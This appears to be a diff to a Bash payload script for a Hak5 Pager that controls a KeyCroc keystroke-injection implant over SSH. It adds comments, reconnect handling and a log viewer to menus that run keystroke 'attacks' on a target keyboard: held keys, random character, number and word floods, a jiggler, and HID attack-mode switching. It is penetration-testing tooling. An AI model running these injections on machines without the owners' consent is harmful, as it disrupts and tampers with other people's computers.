 			LOG yellow "[KEYCROC] Keyboard unlock selected. Restoring input access..."
 			ssh_croc 'sh -lc "QUACK UNLOCK"'
 			LOG green "Keyboard is now unlocked"
 			PROMPT "Keyboard is now unlocked"
 		;;
 		"Hold_key")
+			# Ask the user which key to hold and how long to hold it.
 			LOG yellow "[KEYCROC] Hold-key mode selected. Awaiting key input..."
 			KEY=$(TEXT_PICKER "Enter only one key" "Q") || return
+			# Select one random character from the supplied key input.
 			KEY="${KEY:$((RANDOM % ${#KEY})):1}"
+			# Prompt for the duration of the hold operation in seconds.
 			TIME=$(NUMBER_PICKER "Enter amount of time" "5") || return
 
+			# Send the hold command to KeyCroc.
 			ssh_croc "sh -lc 'QUACK HOLD STRING $KEY'"
 
-			# selected-second countdown
+			# Count down the selected duration while displaying the held key.
 			for ((time=TIME; time>=1; time--)); do
 				LOG "Stopping in $time... selected $KEY"
 				sleep 1
 			done
 
+			# Release the held key after the countdown finishes.
 			ssh_croc 'sh -lc "QUACK RELEASE"'
 
 			LOG green "Hold_key attack stopped"
 			PROMPT "Hold_key attack stopped"
 		;;
-		# Quack Attack menu
+		# Quack Attack menu.
 		"Quack_Attack")
 			LOG yellow "[KEYCROC] Keyboard Quack Attack selected. Initializing payload..."
 			resp=$(LIST_PICKER \
@@ -874,30 +1046,62 @@ Custom_commands() {
 			case "$resp" in
 				"Random_character")
 					LOG yellow "Random character attack selected. Generating keystroke payload..."
+					# Define the pool of characters used to generate random strings.
 					chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:/?.><'"'"'\"`~'
 
-					# Start loop for random chars
+					# Run the random-character attack continuously in the background.
 					while true; do
+						# Generate a new random string containing five characters.
 						random_chars=""
-						for ((n=0; n<5; n++)); do
+						for ((n = 0; n < 5; n++)); do
 							random_chars+="${chars:$((RANDOM % ${#chars})):1}"
 						done
-						ssh_croc "sh -lc 'QUACK STRING \"$random_chars\"'"
-						(( i++ ))
+
+						# Build the remote QUACK command to type the generated string.
+						remote_cmd="QUACK STRING \"$random_chars\""
+						# Send the command to KeyCroc and capture the SSH exit status.
+						ssh_croc "sh -lc $(printf '%q' "$remote_cmd")"
+						ssh_status=$?
+
+						# Handle a lost SSH connection and retry until reconnection succeeds.
+						if [ "$ssh_status" -eq 255 ]; then
+							LOG red "[KEYCROC] Connection lost. Trying to reconnect..."
+							while true; do
+								sleep 3
+								# Test the SSH connection before resuming the attack.
+								if ssh_croc 'true' >/dev/null 2>&1; then
+									LOG green "[KEYCROC] Reconnected. Resuming random-character attack."
+									break
+								fi
+							done
+							# Return to the main loop and generate another random string.
+							continue
+						elif [ "$ssh_status" -ne 0 ]; then
+							LOG red "[KEYCROC] Command failed with status $ssh_status. Continuing..."
+							sleep 1
+							continue
+						fi
+						((i++))
 						LOG red "ATTACK RANDOM CHAR COUNT: $i-$random_chars"
 					done &
 					attack_pid=$!
-
 					stop_attack "Random_character"
 				;;
 				"Random_number")
 					LOG yellow "Random number attack selected. Generating keystroke payload..."
+					# Set the upper limit for randomly generated numbers.
 					NUMBER_N=1000000
 
-					# Start loop for random number
+					# Continuously generate and send random numbers in the background.
 					while true; do
+						# Generate a random number between 1 and NUMBER_N.
 						R_N="$(( ((RANDOM << 15) | RANDOM) % NUMBER_N + 1 ))"
-						ssh_croc "sh -lc 'QUACK STRING \"$R_N\"'"
+						# Send the generated number to KeyCroc as a QUACK string.
+						if ! ssh_croc "sh -lc 'QUACK STRING \"$R_N\"'"; then
+							LOG red "[KEYCROC] Connection lost. Stopping random-number attack."
+							break
+						fi
+						# Increment the successful-send counter and display the result.
 						(( i++ ))
 						LOG red "ATTACK RANDOM NUMBER COUNT: $i-$R_N"
 					done &
@@ -908,40 +1112,52 @@ Custom_commands() {
 				"Random_word")
 					LOG yellow "Random word attack selected. Generating keystroke payload..."
 
-					# Download English word list
+					# Download the English word list if it is not already available locally.
 					if [ ! -f "$WORDFILE" ]; then
+						# Ask the user for permission before downloading the word list.
 						confirm=$(CONFIRMATION_DIALOG "Download English word list? $ENGLISH_WORD_LIST") || return
 						if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
 							spinnerid=$(START_SPINNER "Downloading English word list...")
+							# Download the word list and save it to WORDFILE.
 							if curl -L -s -f "$ENGLISH_WORD_LIST" -o "$WORDFILE"; then
 								STOP_SPINNER "$spinnerid"
 								LOG green "[PAGER] Downloaded English word list to $WORDFILE"
 							else
+								# Stop the spinner and remove the incomplete file if the download fails.
 								STOP_SPINNER "$spinnerid"
 								rm -f "$WORDFILE"
 								LOG red "Failed to download English word list"
 								return
 							fi
 						else
+							# Stop the spinner and exit if the download is declined.
 							STOP_SPINNER "$spinnerid"
 							LOG red "Failed to download English word list"
 							return
 						fi
 					fi
 
-					# Check word file exists
+					# Verify that the word list exists before starting the attack.
 					if [ -f "$WORDFILE" ]; then
 						WORD_COUNT=$(wc -l < "$WORDFILE")
+						# Exit if the word list contains no lines.
 						if [ "$WORD_COUNT" -eq 0 ]; then
 							LOG red "English word list is empty"
 							return
 						fi
 
-						# Start loop for random word
+						# Continuously select random words and send them to KeyCroc.
 						while true; do
+							# Select a random line number from the word list.
 							RANDOM_LINE=$((RANDOM % WORD_COUNT + 1))
+							# Read the word at the randomly selected line.
 							R_W=$(sed -n "${RANDOM_LINE}p" "$WORDFILE")
-							ssh_croc "sh -lc 'QUACK STRING \"$R_W\" ; QUACK KEYCODE 00,00,2c'"
+							# Send the word followed by a Space key command.
+							if ! ssh_croc "sh -lc 'QUACK STRING \"$R_W\" ; QUACK KEYCODE 00,00,2c'"; then
+								LOG red "[KEYCROC] Connection lost. Stopping random-word attack."
+								break
+							fi
+							# Increment the successful-send counter and display the selected word.
 							(( i++ ))
 							LOG red "ATTACK RANDOM WORD COUNT: $i-$R_W"
 						done &
@@ -969,14 +1185,19 @@ Custom_commands() {
 			LOG yellow "[KEYCROC] Keyboard Jiggler selected. Initiating keystroke activity..."
 			LOG "QUACK KEYCODE 00,00,2c and QUACK BACKSPACE"
 
-			# Start loop for Jiggler
+			# Continuously run the keyboard jiggler in the background.
 			while true; do
-				# Start jiggler every 30 seconds
+				# Wait 30 seconds before sending the next keystroke sequence.
 				for ((time=30; time>=1; time--)); do
 					LOG blue "Starting Jiggler in $time..."
 					sleep 1
 				done
-				ssh_croc "sh -lc 'QUACK KEYCODE 00,00,2c ; QUACK BACKSPACE'"
+				# Send a Space key followed by Backspace to create keyboard activity.
+				if ! ssh_croc "sh -lc 'QUACK KEYCODE 00,00,2c ; QUACK BACKSPACE'"; then
+					LOG red "[KEYCROC] Connection lost. Stopping Keyboard Jiggler."
+					break
+				fi
+				# Increment the jiggler counter and display the number of successful executions.
 				(( i++ ))
 				LOG red "KEYBOARD JIGGLER COUNT: $i"
 			done &
@@ -997,16 +1218,44 @@ Custom_commands() {
 	esac
 }
 
-# menu loop for selected keycroc HID mode
+# menu loop for selected keycroc HID mode.
 Attackmode_HID() {
 	LOG yellow "[KEYCROC] AttackMode HID selected. Initializing HID interface..."
 
+	# Execute the selected attack mode command on the remote KeyCroc.
 	run_attackmode() {
 		LOG red "Attackmode Mode selected $1"
-		ssh_croc "sh -lc '$1'" &
-		PROMPT "Keycroc Attackmode is now in $1"
+
+		# Handle payload reloading separately because it requires sending
+		# the RELOAD_PAYLOADS command through a Bash input stream.
+		if [ "$1" = "RELOAD_PAYLOADS" ]; then
+			if ssh_croc 'sh -lc "bash -s"' <<'EOF'
+$RELOAD_PAYLOADS
+EOF
+			then
+				# Report successful submission of the reload command.
+				LOG green "KeyCroc payload reload command sent"
+				PROMPT "KeyCroc payload reload command sent"
+			else
+				LOG red "Failed to send KeyCroc reload command"
+				PROMPT "Failed to send KeyCroc reload command"
+				return
+			fi
+			return
+		fi
+
+		# Send the selected attack mode command to KeyCroc over SSH.
+		if ssh_croc "sh -lc '$1'"; then
+			LOG green "KeyCroc Attackmode is now in $1"
+			PROMPT "KeyCroc Attackmode is now in $1"
+		else
+			LOG red "Failed to change KeyCroc Attackmode."
+			PROMPT "Failed to change KeyCroc Attackmode."
+			return
+		fi
 	}
 
+	# Keep displaying the HID menu until the user exits or returns.
 	while true; do
 		resp=$(LIST_PICKER \
 			"ATTACKMODE HID MENU" \
@@ -1026,6 +1275,7 @@ Attackmode_HID() {
 			"Main_menu"
 		)
 
+		# Run the function associated with the selected menu option.
 		case "$resp" in
 			"ATTACKMODE HID STORAGE") run_attackmode "$resp" ;;
 			"ATTACKMODE HID") run_attackmode "$resp" ;;
@@ -1036,22 +1286,27 @@ Attackmode_HID() {
 			"ATTACKMODE HID AUTO_ETHERNET") run_attackmode "$resp" ;;
 			"ATTACKMODE HID SERIAL") run_attackmode "$resp" ;;
 			"CHECK_KEYBOARD")
+				# Check the remote keyboard status and return a readable result.
 				output=$(ssh_croc 'sh -lc '\''[ "$(KEYBOARD)" = PRESENT ] && echo "KEYBOARD PRESENT" || echo "KEYBOARD MISSING"'\''')
-				LOG green "KEYCROC $output"
+				LOG green "[KEYCROC] $output"
 				PROMPT "KEYCROC $output"
 			;;
 			"KEYBOARD_MONITOR")
+				# Monitor remote keyboard activity and inactivity in the background.
 				keyboard_monitor() {
 					LOG yellow "[KEYCROC] Keyboard ACTIVITY / INACTIVITY. Initiating activity..."
 					LOG green "PRESS ANY BUTTON TO RETURN TO MENU"
-					
+
+					# Repeatedly wait for keyboard inactivity and activity events.
 					while true; do
+						# Wait for the remote keyboard to become inactive.
 						if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_INACTIVITY 1"' 2>/dev/null; then
-							LOG red "KEYCROC KEYBOARD INACTIVE"
+							LOG red "[KEYCROC] KEYBOARD INACTIVE"
 						fi
 
+						# Wait for keyboard activity and report when detected.
 						if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"' 2>/dev/null; then
-							LOG blue "KEYCROC KEYBOARD ACTIVE"
+							LOG blue "[KEYCROC] KEYBOARD ACTIVE"
 						fi
 					sleep 1
 					done
@@ -1059,7 +1314,9 @@ Attackmode_HID() {
 				keyboard_monitor &
 				keyboard_monitor_pid=$!
 
+				# Terminate the monitor and clean up its process entry.
 				WAIT_FOR_INPUT
+				LOG red "[PAGER] Terminating Keyboard monitor session..."
 				kill -9 "$keyboard_monitor_pid" 2>/dev/null
 				wait "$keyboard_monitor_pid" 2>/dev/null
 			;;
@@ -1084,7 +1341,7 @@ Attackmode_HID() {
 	done
 }
 
-# Keycroc status
+# Keycroc status.
 croc_status() {
 	LOG ""
 	LOG blue "================================================="
@@ -1242,9 +1499,67 @@ croc_status() {
 	WAIT_FOR_BUTTON_PRESS A
 }
 
-# Main menu loop
+# Keycroc log menu
+Keycroc_logs() {
+	LOG yellow "View KeyCroc log files on Pager"
+
+	# Get the list of log files from the KeyCroc.
+	LOG_FILE=$(ssh_croc 'ls -1 /var/log/' 2>/dev/null)
+
+	# Check whether SSH failed or no files were returned.
+	if [ -z "$LOG_FILE" ]; then
+		LOG red "[KEYCROC] No logs found or SSH connection failed."
+		PROMPT "No logs found or KeyCroc connection failed."
+		return
+	fi
+
+	# Count the returned filenames.
+	LOG "File /var/log Count: $(printf '%s\n' "$LOG_FILE" | wc -l)"
+	# Build the list for the Pager menu.
+	set --
+	while IFS= read -r file; do
+		[ -n "$file" ] && set -- "$@" "$file"
+	done <<EOF
+$LOG_FILE
+EOF
+
+	# Check whether any files were found.
+	if [ "$#" -eq 0 ]; then
+		LOG red "[KEYCROC] No log files found."
+		PROMPT "No log files found."
+		return
+	fi
+
+	# Build the log menu.
+	resp=$(LIST_PICKER \
+		"KEYCROC LOG" \
+		"$@" \
+		"Cancel" \
+		"Cancel"
+	) || return
+
+	# Handle menu selection.
+	case "$resp" in
+		"Cancel"|"")
+			LOG yellow "[PAGER] Cancelled."
+			return
+		;;
+		*)
+			LOG green "[KEYCROC] Selected log: $resp"
+			# Display the selected log file on the Pager.
+			ssh_croc "cat '/var/log/$resp'" 2>/dev/null |
+			while IFS= read -r line; do
+				LOG "$line"
+			done
+			LOG green "PRESS A BUTTON TO RETURN TO MENU"
+			WAIT_FOR_BUTTON_PRESS A
+		;;
+	esac
+}
+
+# Main menu loop.
 while true; do
-	# Test ssh connection to keycroc
+	# Test ssh connection to keycroc.
 	test_ssh
 
 	resp=$(LIST_PICKER \
@@ -1255,6 +1570,7 @@ while true; do
 		"Custom_commands" \
 		"Attackmode_HID" \
 		"Keycroc_status" \
+		"Keycroc_logs" \
 		"Reboot_Keycroc" \
 		"Exit" \
 		"Exit"
@@ -1279,24 +1595,19 @@ while true; do
 		"Keycroc_status")
 			croc_status
 		;;
+		"Keycroc_logs")
+			Keycroc_logs
+		;;
 		"Reboot_Keycroc")
 			confirm=$(CONFIRMATION_DIALOG "REBOOT KEYCROC. ?") || return
 			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
-				# Reboot keycroc
-				ssh_croc 'sh -lc "reboot --force"' &
+				# Reboot keycroc.
+				ssh_croc 'sh -lc "reboot --force"' >/dev/null 2>&1 &
 				reboot_pid=$!
 				sleep 2
-
-				# Kill ssh session
-				LOG red "[PAGER] Terminating SSH session..."
-
-				kill -9 "reboot_pid=$!" 2>/dev/null
-				ps w | grep '[s]sh -o StrictHostKeyChecking=no' |
-				while read -r pid rest; do
-					kill -9 "$pid" 2>/dev/null
-				done
-
-				LOG red "[KEYCROC] is now rebooting"
+				LOG red "[KEYCROC] Reboot command sent. The connection may drop while it restarts."
+				# Do not kill every SSH process; other commands share the SSH master.
+				wait "$reboot_pid" 2>/dev/null
 				PROMPT "[KEYCROC] is now rebooting"
 			fi
 		;;
